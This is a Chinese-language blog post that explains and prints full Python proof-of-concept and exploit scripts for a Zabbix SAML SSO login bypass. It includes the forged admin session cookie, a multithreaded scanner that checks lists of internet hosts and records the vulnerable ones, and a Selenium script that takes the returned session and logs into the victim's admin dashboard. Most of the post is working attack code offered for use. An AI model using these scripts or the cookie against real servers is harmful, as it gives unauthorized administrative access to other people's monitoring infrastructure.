此漏洞大多大佬都已经做过分析和复现，网上也有很多相关文章，但 **此篇文章主要是分享一些使用python编写poc和exp的思路。**

## 漏洞说明

此漏洞的复现和利用，大致步骤就是访问时抓包，将请求路径改为index_sso.php，cookie替换为

    
    
    zbx_session=eyJzYW1sX2RhdGEiOnsidXNlcm5hbWVfYXR0cmlidXRlIjoiQWRtaW4ifSwic2Vzc2lvbmlkIjoiIiwic2lnbiI6IiJ9

放包后即可绕过登录认证，进入后台

## poc编写(完整代码见文末)

 **1、先贴核心代码：**

![1646106532_621d97a40a02660a6454a.png!small?1646106533086](https://image.3001.net/images/20220301/1646106532_621d97a40a02660a6454a.png!small?1646106533086)

第一步先对url进行一个整合，如果传入的url没有http://，则先拼接上协议，避免后续报错；

第二步先请求一下该页面，使用r.history属性判断是否页面有被重定向（例如有的页面url为:http://xxx.xxx.xxx/,但是访问之后，等页面加载完成，页面url就变成了http://xxx.xxx.xxx/zabbix，如果不处理这种重定向，后续还会拼接index_sso.php,就会产生误报）；

第三步再判断url的结尾是否是“/”，如果是，则拼接index_sso.php，如果不是，则拼接/index_sso.php；

第四步则开始构造requests所需要的参数，url前三步已经构造完毕，还剩请求头，则将构造好的cookie值，直接贴进headers字典，使用requests模块进行请求；

第五步则开始判断什么情况存在漏洞，经过burpsuite抓包后分析，如果存在漏洞，响应包首先是个302的重定向包，且头部会出现一个location的字段，且会指向dashboard.view。如下图所示:

![1646107230_621d9a5e670e23c2d7929.png!small?1646107231448](https://image.3001.net/images/20220301/1646107230_621d9a5e670e23c2d7929.png!small?1646107231448)

则代码中就可以使用r.history属性处理重定向，然后直接判断Location字段中是否存在'dashboard'字符串，如果存在，则说明存在漏洞，并将存在漏洞的url写入success.txt，保存至当前目录下。如果不存在，则说明不存在漏洞。

 **2、第二步涉及到传参的问题，代码如下：**

![1646107465_621d9b4976c260004484d.png!small?1646107466436](https://image.3001.net/images/20220301/1646107465_621d9b4976c260004484d.png!small?1646107466436)

此脚本支持单个url检测和多个url检测，输入1时，进行单个url检测，将输入的url传入bp函数中进行检测。输入其他时，进行批量检测，会按行读取当前目录下的url.txt，将每一行的url进行检测，再添加线程池进行多线程运行，加快检测速度。

 **3、运行效果截图**

![1646115357_621dba1d3cd82d466301a.png!small?1646115359342](https://image.3001.net/images/20220301/1646115357_621dba1d3cd82d466301a.png!small?1646115359342)

## EXP编写(完整代码见文末)

 **1、url传递**

![1646115484_621dba9c74adfb5e4ef6c.png!small?1646115484525](https://image.3001.net/images/20220301/1646115484_621dba9c74adfb5e4ef6c.png!small?1646115484525)

使用sys库，在命令行处进行传递url

 **2、处理url**

![1646115556_621dbae4b1a9048df318a.png!small?1646115556809](https://image.3001.net/images/20220301/1646115556_621dbae4b1a9048df318a.png!small?1646115556809)

和poc脚本一样，需要对url进行处理，整合成http://xxx.xxx.xxx的格式，并且同样需要区分重定向

 **3、获取cookie**

![1646115680_621dbb601b9b509c5c564.png!small?1646115680315](https://image.3001.net/images/20220301/1646115680_621dbb601b9b509c5c564.png!small?1646115680315)

此漏洞的利用，原理就是使用自己构造的cookie值，发送给服务端后，服务端会返回一个登录成功的session。如下图：

![1646115816_621dbbe807881cbc13659.png!small?1646115816431](https://image.3001.net/images/20220301/1646115816_621dbbe807881cbc13659.png!small?1646115816431)

所以同样需要构造一个请求路径为index_sso.php,cookie为上面的字符的请求包，获取302重定向包的响应头，然后用字符分割的方式，将服务端生成的session值获取下来。

 **4、使用selenium库带cookie访问**

![1646116007_621dbca72b3ee34222cec.png!small?1646116007308](https://image.3001.net/images/20220301/1646116007_621dbca72b3ee34222cec.png!small?1646116007308)

selenium库会调浏览器的驱动，进行自动化的操作，这里调用的是谷歌浏览器的驱动。首先还是得处理url最后是否以'/'结尾的问题，直接去构造一个登录后的url访问。还得处理访问https链接时出现的私密链接问题，如下图：

![1646116262_621dbda6550636bb22146.png!small?1646116262446](https://image.3001.net/images/20220301/1646116262_621dbda6550636bb22146.png!small?1646116262446)

需要使用程序去点击高级，和继续前往xxxx页面的链接，所以使用xpath定位到两个链接出，使用click()方法进行模拟点击。如果是http的页面，则不会出现此页面，那xpath就无法定位，程序会报错，因此使用try
except抛出异常。

最后将第3步获取的cookie值，传入字典，使用add_cookie方法给驱动添加上cookie,刷新页面后，即可登入后台

 **5、运行效果如图：**

![1646116641_621dbf21bd05acb2d93e6.png!small?1646116642514](https://image.3001.net/images/20220301/1646116641_621dbf21bd05acb2d93e6.png!small?1646116642514)

（ps：代码运行过程中，不要去手动操作页面，直至登入后台后，方可手动操作，不然程序会报错）

## poc完整代码：

    
    
    import requests
    import re
    from threading import Thread
    import warnings
    from multiprocessing import Pool
    requests.packages.urllib3.disable_warnings()
    def main():
    	warnings.filterwarnings('ignore')  # 忽略SSL警告
    	print ("单url检测请按1，多url检测请按其他任意值:")
    	choose=input()
    	if choose=='1':
    		print ("input:")
    		url=input()
    		bp(url)
    	else:
    		# 读取txt文件
    		with open("./url.txt", "r") as f:
    			pool = Pool(60)
    			for url in f.readlines():
    				url = url.strip('\n')
    				# print(url)
    				pool.apply_async(bp,(url,))
    			pool.close()
    			pool.join()
    				# t = Thread(target=bp, args=(url,))
    				# t.start()
    def bp(url):
    	try:
    		if 'http' not in url:
    			url='http://'+url
    		try:
    			r=requests.get(url,verify=False,timeout=5)
    			reditList = r.history
    			redit=reditList[len(reditList)-1].headers["location"]
    			url=redit
    		except:
    			pass
    		if url[-1]=='/':
    			url2=url+'index_sso.php'
    		else:
    			url2=url+'/index_sso.php'
    		headers={
    		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0',
    		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    		'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    		'Referer': 'https://fofa.info/',
    		'Connection': 'close',
    		'Cookie': 'zbx_session=eyJzYW1sX2RhdGEiOnsidXNlcm5hbWVfYXR0cmlidXRlIjoiQWRtaW4ifSwic2Vzc2lvbmlkIjoiIiwic2lnbiI6IiJ9',
    		'Upgrade-Insecure-Requests': '1',
    		'Cache-Control': 'max-age=0',
    		}
    		r=requests.get(url2,headers=headers,verify=False,timeout=5)
    		#print(r.text)
    		reditList = r.history
    		if len(reditList)>0:
    			redit=reditList[len(reditList)-1].headers["location"]
    			if 'dashboard' in redit:
    				print('[+]   '+url+'存在漏洞')
    				f = open("./success.txt", 'a')
    				f.write(url+'\n')
    				f.close()
    			else:
    				print('[-]   '+url+'不存在漏洞,有重定向')	
    		else:
    			print('[-]   '+url+'不存在漏洞')
    	except:
    		print('[!]   '+url+'连接失败')
    def logo():
    	print('''
    
       _____ __      __ ______      ___    ___  ___   ___        ___   ____  __  ____  __          _____    ____    _____ 
      / ____|\ \    / /|  ____|    |__ \  / _ \|__ \ |__ \      |__ \ |___ \/_ ||___ \/_ |        |  __ \  / __ \  / ____|
     | |      \ \  / / | |__  ______  ) || | | |  ) |   ) |______  ) |  __) || |  __) || | ______ | |__) || |  | || |     
     | |       \ \/ /  |  __||______|/ / | | | | / /   / /|______|/ /  |__ < | | |__ < | ||______||  ___/ | |  | || |     
     | |____    \  /   | |____      / /_ | |_| |/ /_  / /_       / /_  ___) || | ___) || |        | |     | |__| || |____ 
      \_____|    \/    |______|    |____| \___/|____||____|     |____||____/ |_||____/ |_|        |_|      \____/  \_____|
                                                                                                                          
                                                                                                                          
                                     --by dsb V1.0
    		''')
    if __name__ == '__main__':
    	logo()
    	main()

## exp完整代码

    
    
    import requests,urllib3
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.common.keys import Keys
    import time
    import re
    import os,sys
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    def main(url):
    	if 'http' not in url:
    		url='http://'+url
    	try:
    		r=requests.get(url,verify=False,timeout=5)
    		reditList = r.history
    		redit=reditList[len(reditList)-1].headers["location"]
    		url=redit
    	except:
    		pass
    	cookie_dict=get_cookie(url)
    	exp(cookie_dict,url)
    def get_cookie(url):
    	cookie_dict={}
    	
    	if url[-1]=='/':
    		url2=url+'index_sso.php'
    	else:
    		url2=url+'/index_sso.php'
    	headers={
    	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0',
    	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    	'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    	'Referer': 'https://fofa.info/',
    	'Connection': 'close',
    	'Cookie': 'zbx_session=eyJzYW1sX2RhdGEiOnsidXNlcm5hbWVfYXR0cmlidXRlIjoiQWRtaW4ifSwic2Vzc2lvbmlkIjoiIiwic2lnbiI6IiJ9',
    	'Upgrade-Insecure-Requests': '1',
    	'Cache-Control': 'max-age=0',
    	}
    	r=requests.get(url2,headers=headers,verify=False,timeout=5)
    	#print(r.text)
    	reditList = r.history
    	cookie=reditList[len(reditList)-1].headers["Set-Cookie"].split(';')[0]
    	cookie_dict['name']=cookie.split('=')[0]
    	cookie_dict['value']=cookie.split('=')[1]
    	return cookie_dict
    def exp(cookie_dict,url):
    	chromedriver = "chromedriver.exe"
    	os.environ["webdriver.Chrome.driver"] = chromedriver  # 调用chrome浏览器
    	# chrome_options = Options()
    	# chrome_options.add_argument('--headless')
    	# driver = webdriver.Chrome(chrome_options=chrome_options)
    	driver = webdriver.Chrome(chromedriver)
    	driver.maximize_window()
    	if url[-1]=='/':
    		url2=url+'zabbix.php?action=dashboard.view'
    	else:
    		url2=url+'/zabbix.php?action=dashboard.view'
    	driver.get(url2)
    	try:
    		driver.find_element_by_xpath('//*[@id="details-button"]').click()
    		time.sleep(2)
    		driver.find_element_by_xpath('//*[@id="proceed-link"]').click()
    	except:
    		pass
    	cookie_dict = {
    	            # 'domain': '134.209.207.34',
    	            'name': cookie_dict['name'],
    	            'value': cookie_dict['value'],
    	            "expires": '',
    	            'path': '/',
    	            'httpOnly': False,
    	            'HostOnly': False,
    	            'Secure': True
    	        }
    	driver.add_cookie(cookie_dict)
    	# print('asdad')
    	driver.refresh() 
    	while True:
    		time.sleep(1)
    def logo():
    	print('''
      ______ ____    ____  _______        ___     ___    ___    ___          ___    ____    __   ____    __           _______ ___   ___ .______   
     /      |\   \  /   / |   ____|      |__ \   / _ \  |__ \  |__ \        |__ \  |___ \  /_ | |___ \  /_ |         |   ____|\  \ /  / |   _  \  
    |  ,----' \   \/   /  |  |__    ______  ) | | | | |    ) |    ) |  ______  ) |   __) |  | |   __) |  | |  ______ |  |__    \  V  /  |  |_)  | 
    |  |       \      /   |   __|  |______|/ /  | | | |   / /    / /  |______|/ /   |__ <   | |  |__ <   | | |______||   __|    >   <   |   ___/  
    |  `----.   \    /    |  |____        / /_  | |_| |  / /_   / /_         / /_   ___) |  | |  ___) |  | |         |  |____  /  .  \  |  |      
     \______|    \__/     |_______|      |____|  \___/  |____| |____|       |____| |____/   |_| |____/   |_|         |_______|/__/ \__\ | _|      
                                                                                                                                                  
    
      
                                                                  --by dsb V1.0
    
    		''')
    if __name__ == '__main__':
    	logo()
    	if len(sys.argv)<2:
    		print('Usage: python3 zabbix-exp.py url')
    	else:
    		url=sys.argv[1]
    		# print(url)
    		main(url)
    
    

最后，脚本方面有任何问题的欢迎私聊哦！

